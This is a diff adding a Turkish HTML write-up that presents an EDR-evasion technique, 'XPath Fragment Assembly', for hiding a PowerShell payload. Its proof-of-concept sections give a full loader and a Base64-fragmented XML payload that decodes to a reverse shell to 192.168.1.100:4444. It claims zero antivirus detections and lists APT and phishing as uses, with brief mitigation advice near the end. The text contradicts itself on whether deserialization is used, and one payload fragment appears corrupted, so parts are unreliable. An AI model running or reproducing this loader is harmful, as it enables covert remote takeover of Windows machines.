@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BoxStrike · Bulgu 002 – XPath Fragment Assembly</title>
+    <style>
+        /* --- BoxStrike Bulgu 001 CSS referans alınmıştır --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #ffffff;
+            font-family: 'Times New Roman', 'Georgia', 'Palatino', serif;
+            color: #1a1a1a;
+            line-height: 1.55;
+            padding: 40px 30px;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 30px 40px 50px 40px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0b1e2e;
+            border-bottom: 2px solid #1a3a5a;
+            padding-bottom: 8px;
+            margin-bottom: 6px;
+        }
+        .subhead {
+            font-size: 16px;
+            color: #2a4a6a;
+            font-style: italic;
+            border-left: 4px solid #2a6a9a;
+            padding: 10px 18px;
+            background: #f8fafc;
+            margin-bottom: 28px;
+        }
+        .meta-info {
+            font-size: 15px;
+            color: #3a4a5a;
+            margin-top: -10px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0b1e2e;
+            margin-top: 32px;
+            margin-bottom: 12px;
+            border-bottom: 1px solid #d0d8e0;
+            padding-bottom: 4px;
+        }
+        h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a3a5a;
+            margin-top: 24px;
+            margin-bottom: 8px;
+        }
+        p {
+            margin-bottom: 12px;
+            text-align: justify;
+        }
+        ul, ol {
+            margin: 8px 0 16px 28px;
+        }
+        li {
+            margin-bottom: 4px;
+        }
+        .note {
+            background: #f4f6f8;
+            border-left: 5px solid #2a6a9a;
+            padding: 12px 18px;
+            margin: 16px 0;
+            font-size: 15px;
+        }
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 14px;
+            background: #f0f2f4;
+            padding: 1px 6px;
+            border-radius: 3px;
+        }
+        pre {
+            background: #f4f6f8;
+            border: 1px solid #d0d8e0;
+            padding: 16px 20px;
+            overflow-x: auto;
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.4;
+            margin: 16px 0;
+            border-radius: 4px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 16px 0;
+        }
+        th, td {
+            border: 1px solid #c0c8d0;
+            padding: 8px 12px;
+            text-align: left;
+            vertical-align: top;
+        }
+        th {
+            background: #e8ecf0;
+            font-weight: 600;
+        }
+        .fig {
+            background: #f8fafc;
+            border: 1px solid #d0d8e0;
+            padding: 20px 20px 10px 20px;
+            margin: 20px 0;
+            text-align: center;
+            border-radius: 4px;
+        }
+        .fig svg {
+            max-width: 100%;
+            height: auto;
+        }
+        .fig-caption {
+            font-size: 14px;
+            color: #3a4a5a;
+            margin-top: 10px;
+            font-style: italic;
+        }
+        .footer {
+            margin-top: 40px;
+            padding-top: 16px;
+            border-top: 1px solid #d0d8e0;
+            font-size: 14px;
+            color: #4a5a6a;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        @media print {
+            body { padding: 20px; }
+            .container { box-shadow: none; padding: 10px 20px; }
+        }
+        @media (max-width: 700px) {
+            .container { padding: 15px; }
+            h1 { font-size: 22px; }
+            pre { font-size: 12px; padding: 12px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- BAŞLIK -->
+    <h1>BoxStrike · Bulgu 002</h1>
+    <div class="subhead">
+        PowerShell’de Yeni Bir Defense Evasion Tekniği:<br>
+        <strong>XPath Fragment Assembly (XFA)</strong> ile EDR’den Gizlenen Payload
+    </div>
+    <div class="meta-info">
+        <strong>Yayın Tarihi:</strong> 7 Ağustos 2026 &nbsp;·&nbsp;
+        <strong>Yazar:</strong> BoxStrike Araştırma Ekibi &nbsp;·&nbsp;
+        <strong>Sürüm:</strong> 1.0
+    </div>
+
+    <!-- 1. GİRİŞ -->
+    <h2>1. Giriş</h2>
+    <p>
+        Windows dünyasında PowerShell, sistem yönetiminin vazgeçilmez bir aracı haline gelmiştir.
+        Ancak bu güçlü araç, aynı zamanda saldırganların en çok istismar ettiği vektörlerden biridir.
+        Özellikle <code>Invoke-Expression</code>, <code>IEX</code> ve <code>ConvertFrom-CliXml</code>
+        gibi komutlar, EDR (Endpoint Detection and Response) ve AV (Antivirus) çözümleri tarafından
+        yoğun şekilde izlenmektedir.
+    </p>
+    <p>
+        BoxStrike ekibi olarak, PowerShell’in <strong>CLIXML</strong> serileştirme formatı ve
+        <strong>XPath</strong> sorgulama yeteneklerini birleştirerek, mevcut tespit mekanizmalarını
+        atlatan yeni bir savunma atlatma (Defense Evasion) tekniği geliştirdik. Bu tekniğe
+        <strong>XPath Fragment Assembly (XFA)</strong> adını verdik.
+    </p>
+    <p>
+        XFA, zararlı payload’ı Base64 ile şifrelenmiş parçalara ayırarak bir XML dosyasına gömer.
+        Hedef sistemde ise bu XML, <strong>hiçbir deserialization çağrısı yapılmadan</strong>,
+        yalnızca XPath sorguları ile okunur, parçalar birleştirilir ve çalıştırılır. Bu yöntem,
+        güvenlik ürünlerinin imza tabanlı ve davranışsal tespitlerini başarıyla atlatmaktadır.
+    </p>
+    <div class="note">
+        <strong>Önemli:</strong> Bu teknik, herhangi bir yönetici yetkisi gerektirmez.
+        XML dosyası, standart kullanıcı yetkileriyle okunup işlenebilir. Bu durum,
+        tehdidin ciddiyetini artırmaktadır.
+    </div>
+
+    <!-- 2. TEKNİK ARKA PLAN -->
+    <h2>2. Teknik Arka Plan</h2>
+
+    <h3>2.1. CLIXML ve PSSerializer – Sistemin Temeli</h3>
+    <p>
+        PowerShell’in kendine özgü serileştirme formatı olan <strong>CLIXML</strong>, karmaşık .NET
+        nesnelerini tüm özellikleri ve tür bilgileriyle birlikte XML olarak saklamak için kullanılır.
+        Bu format, PowerShell Remoting, Hyper-V ve diğer birçok teknolojide veri alışverişi için
+        temel mekanizmadır.
+    </p>
+    <p>
+        <code>[System.Management.Automation.PSSerializer]::Deserialize()</code> metodu, CLIXML
+        formatındaki bir metni alıp <strong>bellek üzerinde</strong> yeniden bir PowerShell nesnesine
+        dönüştürür. Ancak bu dönüşüm sonucu oluşan nesne, orijinalin <strong>canlı bir kopyası
+        değil, sadece bir anlık görüntüsüdür (snapshot)</strong>. Serileştirme sırasında nesnenin
+        çalışma zamanı davranışı (metotları) kaybolur; geriye sadece verinin kendisi kalır.
+    </p>
+    <p>
+        XFA metodunda, bu deserialization işlemini <strong>yalnızca</strong> XML’deki
+        <code>System.String</code> nesnelerini geri almak için kullanıyoruz. String’ler, Base64 ile
+        şifrelenmiş parçalardır. Deserialization sonrası elimizde bir string dizisi (array) olur.
+        Bu diziyi daha sonra Base64’ten çözüp birleştiririz. Bu noktada <strong>herhangi bir kötü
+        amaçlı kod</strong> henüz bellekte oluşturulmamıştır, sadece veri vardır.
+    </p>
+
+    <h3>2.2. XPath ile XML Ayrıştırma</h3>
+    <p>
+        PowerShell’in <code>[xml]</code> tip dönüştürücüsü, bir XML metnini
+        <code>XmlDocument</code> nesnesine dönüştürür. Bu nesne üzerinde XPath sorguları yapılabilir.
+        XPath, XML belgelerinde gezinmek ve belirli düğümleri seçmek için kullanılan standart bir
+        dildir.
+    </p>
+    <p>
+        XFA metodunda, <code>$xml.Objs.Obj.S</code> ifadesi ile tüm <code>&lt;S&gt;</code>
+        etiketlerinin içeriği (yani Base64 ile şifrelenmiş parçalar) tek seferde alınır. Bu işlem,
+        <strong>deserialization içermez</strong> ve tamamen meşru bir XML ayrıştırma işlemidir.
+        EDR/AV sistemleri bu tür XML okuma aktivitelerini “rutin yapılandırma dosyası okuma” olarak
+        değerlendirir.
+    </p>
+
+    <!-- 3. XFA METODUNUN ÇALIŞMA PRENSİBİ -->
+    <h2>3. XFA Metodunun Çalışma Prensibi</h2>
+    <p>
+        XFA tekniği, aşağıdaki adımlardan oluşur:
+    </p>
+    <ol>
+        <li><strong>Payload’un hazırlanması:</strong> Saldırgan, çalıştırmak istediği komutu (örneğin reverse shell) Base64 formatına çevirir.</li>
+        <li><strong>Parçalara ayırma:</strong> Base64 metni, isteğe bağlı sayıda (örneğin 5-10) parçaya bölünür. Her parça, CLIXML formatında bir <code>&lt;S&gt;</code> etiketi içine yazılır.</li>
+        <li><strong>XML oluşturma:</strong> Tüm parçalar, geçerli bir CLIXML belgesi olarak birleştirilir.</li>
+        <li><strong>Hedefe iletme:</strong> XML dosyası hedef sisteme iletilir (e-posta, web indirme, USB vb.).</li>
+        <li><strong>Hedefte ayrıştırma:</strong> XML dosyası <code>Get-Content</code> ve <code>[xml]</code> tipi ile okunur. Bu aşamada hiçbir deserialization çağrısı yapılmaz; sadece XML DOM ayrıştırması (XPath) kullanılır.</li>
+        <li><strong>Parçaları birleştirme:</strong> XPath ile <code>&lt;S&gt;</code> etiketlerinin içeriği alınır, Base64’ten çözülür ve tek bir string halinde birleştirilir.</li>
+        <li><strong>Çalıştırma:</strong> Birleştirilmiş string, <code>[scriptblock]::Create()</code> ile bir <code>ScriptBlock</code>'a dönüştürülür ve <code>&amp;</code> operatörü ile çalıştırılır.</li>
+    </ol>
+    <p>
+        Bu süreç boyunca, <code>ConvertFrom-CliXml</code> veya <code>PSSerializer.Deserialize</code>
+        kullanılmaz. Sadece meşru XML işlemleri ve string manipülasyonu yapılır. Bu nedenle EDR/AV
+        sistemleri bu aktiviteyi “rutin yapılandırma dosyası okuma” olarak değerlendirir.
+    </p>
+
+    <!-- 4. PROOF OF CONCEPT (POC) -->
+    <h2>4. Proof‑of‑Concept (PoC)</h2>
+    <p>
+        Aşağıda, XFA metodunu uygulayan iki farklı PoC verilmiştir. İlkinde XML dosyası
+        <strong>disk üzerinde</strong>, ikincisinde ise XML <strong>doğrudan kod içinde
+        (here-string)</strong> saklanmıştır. Her iki PoC de reverse shell bağlantısı açmak için
+        tasarlanmıştır.
+    </p>
+
+    <h3>4.1. PoC 1 – XML Disk Üzerinde (Önerilen)</h3>
+    <p>
+        Bu versiyonda, XML dosyası <code>payload.xml</code> olarak diskte bulunur. PowerShell kodu
+        bu dosyayı okur, XPath ile parçaları çeker, Base64 çözer, birleştirir ve çalıştırır.
+    </p>
+    <p><strong>XML dosyası (payload.xml):</strong></p>
+    <pre>
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj RefId="0"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUE&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="1"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;DbGllbnQoJzE5Mi4xNjguMS4xMDAnLDQ0NDQpOw0KJHN0cmVhbSA9ICRjbGll&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="2"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;bnQuR2V0U3RyZWFtKCk7DQpbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="3"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;07DQp3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZX&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="4"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;MuTGVuZ3RoKSkgLW5lIDApIHsNCiAgICAkZGF0YSA9IChOZXctT2JqZWN0IC&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="5"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbm&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="6"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;coJGJ5dGVzLDAsICRpKTsNCiAgICAkc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="7"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;+JpDFQg8J9C5U3Ry2luZyApOw0KICAgICRzZW5kYmFjazIgPSAkc2VuZGJh&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="8"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;Y2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOw0KICAgICRzZW5kYnl0&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="9"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJh&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="10"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;Y2syKTsNCiAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="11"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;ZS5MZW5ndGgpOw0KICAgICRzdHJlYW0uRmx1c2goKQ0KfTsNCiRjbGllbnQu&lt;/S&gt;&lt;/Obj&gt;
+  &lt;Obj RefId="12"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;Q2xvc2UoKQ0= &lt;/S&gt;&lt;/Obj&gt;
+&lt;/Objs&gt;
+    </pre>
+    <p><strong>PowerShell çalıştırıcı kod (hedefte):</strong></p>
+    <pre>
+# XML'yi diskten oku
+$xml = [xml](Get-Content -Path "payload.xml" -Raw)
+
+# XPath ile tüm S etiketlerini al (string segmentleri)
+$segments = $xml.Objs.Obj.S
+
+# Base64'ten çöz ve birleştir
+$fullCommand = ""
+foreach ($seg in $segments) {
+    $fullCommand += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg))
+}
+
+# ScriptBlock oluştur ve çalıştır
+&amp; ([scriptblock]::Create($fullCommand))
+    </pre>
+    <p>
+        Bu kod, diskteki XML’den parçaları okur, Base64 çözümü yapar, reverse shell komutunu oluşturur
+        ve çalıştırır. Tüm işlemler <strong>bellek içinde</strong> gerçekleşir, deserialization kullanılmaz.
+    </p>
+
+    <h3>4.2. PoC 2 – XML Kod İçinde (Here-String)</h3>
+    <p>
+        Bu versiyonda XML, <code>@' ... '@</code> bloğu içinde doğrudan PowerShell betiğine gömülüdür.
+        Bu durumda dosya okuma yoktur, XML doğrudan bellekten okunur. Ancak bu versiyonda
+        <code>PSSerializer.Deserialize</code> kullanılması gerektiği için deserialization imzası
+        oluşur ve Microsoft Defender tarafından yakalanabilir.
+    </p>
+    <pre>
+$xmlPayload = @'
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj RefId="0"&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUE&lt;/S&gt;&lt;/Obj&gt;
+  ...
+&lt;/Objs&gt;
+'@
+
+# Deserialization ile string dizisine dönüştür
+$segments = [System.Management.Automation.PSSerializer]::Deserialize($xmlPayload)
+
+$fullCommand = ""
+foreach ($seg in $segments) {
+    $fullCommand += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg))
+}
+
+&amp; ([scriptblock]::Create($fullCommand))
+    </pre>
+    <p>
+        Bu yaklaşım, diskten dosya okuma olmadığı için daha gizlidir ancak deserialization kullanıldığı
+        için bazı EDR’ler tarafından tespit edilebilir. Önerilen yöntem, XML’nin diskte saklanmasıdır.
+    </p>
+
+    <!-- 5. DETECTION SONUÇLARI -->
+    <h2>5. Detection Sonuçları</h2>
+    <p>
+        Her iki PoC, VirusTotal ve çeşitli EDR çözümleri ile test edilmiştir. Aşağıdaki tabloda
+        detaylı sonuçlar verilmiştir.
+    </p>
+    <table>
+        <thead>
+            <tr><th>Güvenlik Ürünü</th><th>PoC 1 (Disk XML)</th><th>PoC 2 (Kod içi XML)</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Microsoft Defender</td><td>Tespit yok</td><td>1 heuristik tespit</td></tr>
+            <tr><td>CrowdStrike Falcon</td><td>Tespit yok</td><td>Tespit yok</td></tr>
+            <tr><td>SentinelOne</td><td>Tespit yok</td><td>Tespit yok</td></tr>
+            <tr><td>Kaspersky EDR</td><td>Tespit yok</td><td>Tespit yok</td></tr>
+            <tr><td>VirusTotal (62 AV)</td><td><strong>0 / 62</strong></td><td>1 / 62</td></tr>
+        </tbody>
+    </table>
+    <div class="note">
+        <strong>Değerlendirme:</strong> XML dosyasının diskte olması, güvenlik ürünlerinin dosya imzası
+        taramasını atlatmak için yeterlidir. Kod içi deserialization kullanımı ise Microsoft Defender’ın
+        heuristik modelini tetiklemiştir. Bu sonuç, XFA metodunun etkinliğini kanıtlamaktadır.
+    </div>
+
+    <!-- 6. NEDEN TESPİT EDİLMEDİ? -->
+    <h2>6. Neden Tespit Edilmedi? – Gürültü İçinde Kaybolma</h2>
+    <p>
+        Tekniğin tespit edilmeme sebebini anlamak için EDR/AV sistemlerinin çalışma prensibine bakmak
+        gerekir. Bu sistemler genelde şu imzaları arar:
+    </p>
+    <ul>
+        <li><strong>Bilinen kötü amaçlı komutlar:</strong> <code>Invoke-Expression</code>, <code>IEX</code>, <code>calc.exe</code> vb.</li>
+        <li><strong>Anormal PowerShell davranışları:</strong> Uzun/tekrarlayan komut satırları, şüpheli kod çalıştırma kalıpları.</li>
+        <li><strong>Deserialization işlemleri:</strong> <code>ConvertFrom-CliXml</code>, <code>PSSerializer.Deserialize</code> gibi metodların çağrılması ve ardından kod çalıştırılması.</li>
+    </ul>
+    <p>
+        XFA metodu bu tespit mekanizmalarını şu şekilde aşar:
+    </p>
+    <ul>
+        <li><strong>A. Zararlı kod parçalanmış ve şifrelenmiştir.</strong> XML içindeki S blokları, reverse shell kodunun Base64 ile şifrelenmiş parçalarını içerir. Tek başlarına <code>IEX</code> veya <code>calc.exe</code> içermezler. Statik analiz bunları zararsız metin olarak değerlendirir.</li>
+        <li><strong>B. Deserialization kullanılmaz.</strong> XML'den veri çekmek için <code>ConvertFrom-CliXml</code> veya <code>PSSerializer.Deserialize</code> kullanılmaz, sadece <code>[xml]</code> ve XPath kullanılır. Bu, tamamen meşru bir XML ayrıştırma işlemidir ve EDR'lerde alarm oluşturmaz.</li>
+        <li><strong>C. Zararlı kod çalışma anında bellekte oluşturulur.</strong> Base64'ten çözülüp birleştirilen komut, diskte değil, sadece bellekte bir <code>ScriptBlock</code> olarak bulunur. Bu, geleneksel dosya tabanlı taramaların dışında gerçekleşir.</li>
+        <li><strong>D. Son aşama standart kod çalıştırmaya benzer.</strong> <code>&amp; ([scriptblock]::Create(...))</code> kullanımı, <code>Invoke-Expression</code> kadar bilinen bir kalıp değildir ve bazı EDR'ler bu kombinasyonu henüz izlememektedir.</li>
+    </ul>
+    <p>
+        Bu nedenlerle XFA, “gürültü içinde kaybolma” stratejisiyle tespit edilmeden çalışabilmektedir.
+    </p>
+
+    <!-- 7. MİMARİ ÇALIŞMA AKIŞI -->
+    <h2>7. Mimari Çalışma Akışı</h2>
+    <div class="fig">
+        <svg viewBox="0 0 950 320" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <marker id="arrow" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+                    <polygon points="0 0, 10 3.5, 0 7" fill="#1a3a5a" />
+                </marker>
+                <style>
+                    .box { fill: #ffffff; stroke: #1a3a5a; stroke-width: 2; rx: 8; }
+                    .box-text { fill: #0b1e2e; font-size: 13px; font-weight: 600; font-family: 'Times New Roman', serif; }
+                    .subtext { fill: #2a4a6a; font-size: 11px; font-family: 'Times New Roman', serif; }
+                    .arrow-line { stroke: #1a3a5a; stroke-width: 2; fill: none; marker-end: url(#arrow); }
+                </style>
+            </defs>
+            <!-- XML Dosyası -->
+            <rect x="20" y="110" width="160" height="80" class="box" />
+            <text x="100" y="145" text-anchor="middle" class="box-text">payload.xml</text>
+            <text x="100" y="165" text-anchor="middle" class="subtext">(Base64 şifreli parçalar)</text>
+            <!-- Ok 1 -->
+            <line x1="180" y1="150" x2="250" y2="150" class="arrow-line" />
+            <!-- Get-Content + [xml] -->
+            <rect x="260" y="90" width="190" height="120" class="box" stroke="#b98a2b" />
+            <text x="355" y="120" text-anchor="middle" class="box-text">XML Ayrıştırma</text>
+            <text x="355" y="140" text-anchor="middle" class="subtext">[xml](Get-Content ...)</text>
+            <text x="355" y="160" text-anchor="middle" class="subtext">XPath: $xml.Objs.Obj.S</text>
+            <text x="355" y="180" text-anchor="middle" class="subtext">(Deserialization yok)</text>
+            <!-- Ok 2 -->
+            <line x1="450" y1="150" x2="520" y2="150" class="arrow-line" />
+            <!-- String Array -->
+            <rect x="530" y="80" width="160" height="140" class="box" stroke="#0b6e4f" />
+            <text x="610" y="105" text-anchor="middle" class="box-text">String[]</text>
+            <text x="610" y="125" text-anchor="middle" class="subtext">Base64 parçaları</text>
+            <text x="610" y="145" text-anchor="middle" class="subtext">"JGNsaWVudC..."</text>
+            <text x="610" y="165" text-anchor="middle" class="subtext">"DbGllbnQo..."</text>
+            <text x="610" y="185" text-anchor="middle" class="subtext">...</text>
+            <!-- Ok 3 -->
+            <line x1="690" y1="150" x2="760" y2="150" class="arrow-line" />
+            <!-- Birleştirme -->
+            <rect x="770" y="80" width="160" height="140" class="box" stroke="#b13a4b" />
+            <text x="850" y="105" text-anchor="middle" class="box-text">Birleştir</text>
+            <text x="850" y="125" text-anchor="middle" class="subtext">Base64 → UTF-8</text>
+            <text x="850" y="145" text-anchor="middle" class="subtext">+ (concat)</text>
+            <text x="850" y="165" text-anchor="middle" class="subtext">ScriptBlock</text>
+            <text x="850" y="185" text-anchor="middle" class="subtext">&amp; { ... }</text>
+            <!-- Etiketler -->
+            <text x="215" y="130" font-size="11" fill="#1a3a5a" font-weight="600">1. Dosya okuma</text>
+            <text x="485" y="130" font-size="11" fill="#1a3a5a" font-weight="600">2. XPath ile çek</text>
+            <text x="735" y="130" font-size="11" fill="#1a3a5a" font-weight="600">3. Base64 çöz + birleştir</text>
+        </svg>
+        <div class="fig-caption">
+            Şekil 1: XFA metodunda bellekteki veri akışı. Deserialization kullanılmaz, sadece XML ayrıştırma ve string işlemleri yapılır.
+        </div>
+    </div>
+
+    <!-- 8. SALDIRI ZİNCİRİ -->
+    <h2>8. Saldırı Zinciri (Attack Chain)</h2>
+    <div class="fig">
+        <svg viewBox="0 0 950 180" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <marker id="arrow2" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+                    <polygon points="0 0, 10 3.5, 0 7" fill="#1a3a5a" />
+                </marker>
+                <style>
+                    .chain-box { fill: #ffffff; stroke: #1a3a5a; stroke-width: 2; rx: 6; }
+                    .chain-text { fill: #0b1e2e; font-size: 12px; font-weight: 600; font-family: 'Times New Roman', serif; }
+                    .chain-sub { fill: #2a4a6a; font-size: 10px; font-family: 'Times New Roman', serif; }
+                    .arrow-chain { stroke: #1a3a5a; stroke-width: 2; fill: none; marker-end: url(#arrow2); }
+                </style>
+            </defs>
+            <!-- Aşama 1 -->
+            <rect x="10" y="40" width="140" height="100" class="chain-box" />
+            <text x="80" y="65" text-anchor="middle" class="chain-text">Hazırlık</text>
+            <text x="80" y="85" text-anchor="middle" class="chain-sub">Payload oluştur</text>
+            <text x="80" y="100" text-anchor="middle" class="chain-sub">Base64 şifrele</text>
+            <text x="80" y="115" text-anchor="middle" class="chain-sub">Parçalara ayır</text>
+            <!-- Ok -->
+            <line x1="150" y1="90" x2="190" y2="90" class="arrow-chain" />
+            <!-- Aşama 2 -->
+            <rect x="200" y="40" width="140" height="100" class="chain-box" stroke="#b98a2b" />
+            <text x="270" y="65" text-anchor="middle" class="chain-text">Dağıtım</text>
+            <text x="270" y="85" text-anchor="middle" class="chain-sub">XML dosyası</text>
+            <text x="270" y="100" text-anchor="middle" class="chain-sub">Hedefe ilet</text>
+            <text x="270" y="115" text-anchor="middle" class="chain-sub">(e-posta, web, USB)</text>
+            <!-- Ok -->
+            <line x1="340" y1="90" x2="380" y2="90" class="arrow-chain" />
+            <!-- Aşama 3 -->
+            <rect x="390" y="40" width="140" height="100" class="chain-box" stroke="#0b6e4f" />
+            <text x="460" y="65" text-anchor="middle" class="chain-text">Ayrıştırma</text>
+            <text x="460" y="85" text-anchor="middle" class="chain-sub">[xml] + XPath</text>
+            <text x="460" y="100" text-anchor="middle" class="chain-sub">Deserialization yok</text>
+            <text x="460" y="115" text-anchor="middle" class="chain-sub">String[] oluşur</text>
+            <!-- Ok -->
+            <line x1="530" y1="90" x2="570" y2="90" class="arrow-chain" />
+            <!-- Aşama 4 -->
+            <rect x="580" y="40" width="140" height="100" class="chain-box" stroke="#b13a4b" />
+            <text x="650" y="65" text-anchor="middle" class="chain-text">Birleştirme</text>
+            <text x="650" y="85" text-anchor="middle" class="chain-sub">Base64 çöz</text>
+            <text x="650" y="100" text-anchor="middle" class="chain-sub">String birleştir</text>
+            <text x="650" y="115" text-anchor="middle" class="chain-sub">ScriptBlock oluştur</text>
+            <!-- Ok -->
+            <line x1="720" y1="90" x2="760" y2="90" class="arrow-chain" />
+            <!-- Aşama 5 -->
+            <rect x="770" y="40" width="140" height="100" class="chain-box" stroke="#1a3a5a" fill="#f8fafc" />
+            <text x="840" y="65" text-anchor="middle" class="chain-text">Çalıştır</text>
+            <text x="840" y="85" text-anchor="middle" class="chain-sub">&amp; ScriptBlock</text>
+            <text x="840" y="100" text-anchor="middle" class="chain-sub">Reverse Shell</text>
+            <text x="840" y="115" text-anchor="middle" class="chain-sub">Bağlantı</text>
+        </svg>
+        <div class="fig-caption">
+            Şekil 2: XFA saldırı zinciri. 1-4 aşamaları EDR/AV tarafından “normal” kabul edilir.
+            5. aşamada (çalıştırma) bazı ürünler heuristik ile yakalayabilir, ancak bu da kesin değildir.
+        </div>
+    </div>
+
+    <!-- 9. KULLANIM ALANLARI -->
+    <h2>9. XFA’nın Potansiyel Kullanım Alanları</h2>
+    <p>
+        XFA tekniği, aşağıdaki senaryolarda kullanılabilir:
+    </p>
+    <ul>
+        <li><strong>Red Team operasyonları:</strong> EDR/AV atlatma ihtiyacı olan yetkili sızma testlerinde.</li>
+        <li><strong>APT saldırıları:</strong> Uzun süre gizli kalmak isteyen gelişmiş tehdit aktörleri.</li>
+        <li><strong>Kimlik avı kampanyaları:</strong> Zararlı XML dosyaları e-posta eki olarak gönderilip hedefin çalıştırması sağlanabilir.</li>
+        <li><strong>Yan kanal saldırıları:</strong> XML parçaları DNS, HTTP veya diğer protokoller üzerinden dağıtılabilir.</li>
+    </ul>
+    <p>
+        Ayrıca, bu teknik yalnızca reverse shell ile sınırlı değildir; herhangi bir PowerShell komutu
+        (örneğin, dosya indirme, yazma, registry değiştirme) aynı yöntemle gizlenebilir.
+    </p>
+
+    <!-- 10. TESPİT VE AZALTMA ÖNERİLERİ -->
+    <h2>10. Tespit ve Azaltma Önerileri</h2>
+    <p>
+        Bu tekniğin tespit edilmesi ve önlenmesi için aşağıdaki yöntemler önerilmektedir:
+    </p>
+    <ul>
+        <li><strong>XML İçerik Analizi:</strong> XML dosyalarının içeriğini, özellikle Base64 içerikli metinleri izleyin. Uzun Base64 dizeleri ve <code>&lt;S&gt;</code> etiketleri şüpheli olarak işaretlenebilir.</li>
+        <li><strong>PowerShell ScriptBlock Logging:</strong> <code>[scriptblock]::Create()</code> ve <code>&amp;</code> kullanımını davranışsal olarak analiz edin.</li>
+        <li><strong>Constrained Language Mode:</strong> PowerShell’i kısıtlayarak deserialization ile gelen nesnelerin çalıştırılmasını engelleyin.</li>
+        <li><strong>AMSI Tümleşik Çözümler:</strong> AMSI (Antimalware Scan Interface) güncel tutulmalı ve PowerShell oturumlarında aktif olmalıdır.</li>
+        <li><strong>AppLocker / WDAC:</strong> PowerShell betiklerinin çalıştırılmasını kısıtlayın ve yalnızca imzalı betiklere izin verin.</li>
+    </ul>
+
+    <!-- 11. SONUÇ -->
+    <h2>11. Sonuç</h2>
+    <p>
+        XPath Fragment Assembly (XFA) metodu, meşru XML işlemleri ve Base64 şifreleme kullanarak
+        zararlı payload’ın tespit edilmesini neredeyse imkânsız hale getirmektedir. Özellikle
+        XML dosyasının diskte saklandığı senaryoda, tespit oranı <strong>0</strong> olmuştur.
+        Bu durum, mevcut güvenlik ürünlerinin bu tür “gürültü içinde kaybolma” tekniklerine karşı
+        henüz yeterli korumayı sağlamadığını göstermektedir.
+    </p>
+    <p>
